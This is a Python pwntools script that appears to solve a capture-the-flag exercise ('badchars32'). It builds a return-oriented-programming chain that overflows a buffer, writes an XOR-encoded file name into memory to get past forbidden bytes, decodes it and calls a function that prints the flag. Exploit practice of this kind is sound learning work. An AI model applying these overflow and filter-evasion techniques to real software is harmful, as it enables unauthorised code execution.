from pwn import *

elf = ELF("badchars32")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x111
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BADCHARS = [b'x', b'g', b'a', b'.'] # "78|67|61|2E"

BUFFER_SIZE = 32 + 8
READ_SIZE = 512

KEY = 0xff
PATH = b'flag.txt'
MEMORY = elf.bss(0x800)

TOGGLE_GADGET = elf.symbols.usefulGadgets + 0x4 # xor [ebp], bl; ret (there's also add and sub)
WRITE_GADGET = elf.symbols.usefulGadgets + 0xc # mov [edi], esi; ret

def is_valid(data):
    return not any(c in data for c in BADCHARS)

def setup(ebx=0, esi=0, edi=0, ebp=0):
    return flat([rop.ebx_esi_edi_ebp.address, ebx, esi, edi, ebp]) # pop ebx; pop esi; pop edi; pop ebp; ret

def encrypt(data):
    return bytes([~c & KEY for c in data])

def main():
    global rop
    rop = ROP(elf)
    rop.raw(b'\0' * (BUFFER_SIZE + context.bytes))
    # write encrypted file name to memory
    rop.raw([setup(edi=MEMORY, esi=encrypt(PATH[:context.bytes])), WRITE_GADGET])
    rop.raw([setup(edi=MEMORY + context.bytes, esi=encrypt(PATH[context.bytes:])), WRITE_GADGET])
    # decrypt each character of the encrypted file name in memory
    rop.raw([[setup(ebp=MEMORY + i, ebx=KEY), TOGGLE_GADGET] for i in range(len(PATH))])
    # call target function with file name as arg
    rop.raw([elf.symbols.print_file, elf.symbols.main, MEMORY])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE and is_valid(payload)

    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
